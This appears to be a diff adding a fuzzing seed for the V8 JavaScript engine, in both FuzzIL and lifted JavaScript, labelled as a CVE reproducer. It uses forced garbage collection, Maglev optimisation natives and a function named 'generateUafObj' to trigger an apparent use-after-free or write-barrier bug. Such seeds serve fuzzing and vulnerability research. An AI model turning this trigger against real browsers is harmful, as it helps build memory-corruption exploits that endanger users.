@@ -1,0 +1,122 @@
+v0 <- LoadString 'main begin'
+v1 <- CreateNamedVariable 'print', 'none'
+v2 <- CallFunction v1, [v0]
+v3 <- LoadInteger '0'
+BeginObjectLiteral
+    ObjectLiteralAddProperty `f`, v3
+v4 <- EndObjectLiteral
+v5 <- CreateNamedVariable 'o1', 'let', v4
+v6 <- LoadString 'assign 1'
+v7 <- CallFunction v1, [v6]
+BeginObjectLiteral
+v8 <- EndObjectLiteral
+v9 <- CreateNamedVariable 'from', 'let', v8
+SetProperty v9, 'f', v9
+BeginObjectLiteral
+v10 <- EndObjectLiteral
+v11 <- CreateNamedVariable 'Object', 'none'
+v12 <- CallMethod v11, 'assign', [v10, v9]
+v13 <- LoadString 'major'
+BeginObjectLiteral
+    ObjectLiteralAddProperty `type`, v13
+v14 <- EndObjectLiteral
+v15 <- CreateNamedVariable 'gc', 'none'
+v16 <- CallFunction v15, [v14]
+v17 <- LoadString 'prepare fin'
+v18 <- CallFunction v1, [v17]
+v19 <- LoadString 'minor'
+BeginObjectLiteral
+    ObjectLiteralAddProperty `type`, v19
+v20 <- EndObjectLiteral
+v21 <- CallFunction v15, [v20]
+BeginObjectLiteral
+v22 <- EndObjectLiteral
+v23 <- CreateNamedVariable 'mark_obj', 'let', v22
+SetProperty v5, 'f', v23
+v24 <- Eval '%DebugPrint(%@)', [v5]
+BeginForLoopInitializer
+    v25 <- LoadInteger '0'
+BeginForLoopCondition -> v26
+    v27 <- LoadInteger '70'
+    v28 <- Compare v26, '<', v27
+BeginForLoopAfterthought v28 -> v29
+    v30 <- UnaryOperation v29, '++'
+BeginForLoopBody -> v31, v32
+    v33 <- CallFunction v1, [v31]
+    BeginObjectLiteral
+    v34 <- EndObjectLiteral
+    SetComputedProperty v5, v31, v34
+EndForLoop
+v35 <- LoadString 'write barrier trigger finish'
+v36 <- CallFunction v1, [v35]
+BeginForLoopInitializer
+    v37 <- LoadInteger '0'
+BeginForLoopCondition -> v38
+    v39 <- LoadInteger '1'
+    v40 <- Compare v38, '<', v39
+BeginForLoopAfterthought v40 -> v41
+    v42 <- UnaryOperation v41, '++'
+BeginForLoopBody -> v43, v44
+    v45 <- CallFunction v1, [v43]
+    v46 <- CreateNamedVariable 'Array', 'none'
+    v47 <- LoadInteger '16384'
+    v48 <- Construct v46, [v47]
+EndForLoop
+v49 <- BeginPlainFunction -> v50
+    BeginObjectLiteral
+    v51 <- EndObjectLiteral
+    v52 <- CreateNamedVariable 'uaf', 'let', v51
+    SetProperty v52, 'f', v52
+    v53 <- CallMethod v11, 'assign', [v50, v52]
+EndPlainFunction
+v54 <- Eval '%PrepareFunctionForOptimization(%@)', [v49]
+BeginObjectLiteral
+v55 <- EndObjectLiteral
+v56 <- CallFunction v49, [v55]
+v57 <- Eval '%OptimizeMaglevOnNextCall(%@)', [v49]
+v58 <- CallFunction v49, [v23]
+v59 <- LoadString 'major'
+BeginObjectLiteral
+    ObjectLiteralAddProperty `type`, v59
+v60 <- EndObjectLiteral
+v61 <- CallFunction v15, [v60]
+v62 <- LoadString 'main fin ========='
+v63 <- CallFunction v1, [v62]
+v64 <- Eval '%SystemBreak()', []
+
+
+print("main begin");
+let o1 = { f: 0 };
+print("assign 1");
+let from = {};
+from.f = from;
+Object.assign({}, from);
+gc({ type: "major" });
+print("prepare fin");
+gc({ type: "minor" });
+let mark_obj = {};
+o1.f = mark_obj;
+const v24 = %DebugPrint(o1);
+for (let i26 = 0; i26 < 70; i26++) {
+    print(i26);
+    o1[i26] = {};
+}
+print("write barrier trigger finish");
+for (let i38 = 0; i38 < 1; i38++) {
+    print(i38);
+    new Array(16384);
+}
+function generateUafObj(a50) {
+    let uaf = {};
+    uaf.f = uaf;
+    Object.assign(a50, uaf);
+}
+const v54 = %PrepareFunctionForOptimization(generateUafObj);
+generateUafObj({});
+const v57 = %OptimizeMaglevOnNextCall(generateUafObj);
+generateUafObj(mark_obj);
+gc({ type: "major" });
+print("main fin =========");
+const v64 = %SystemBreak();
+
+FuzzIL program written to /v8/fuzzilli/seed_cve2025_2026/test3.fzil
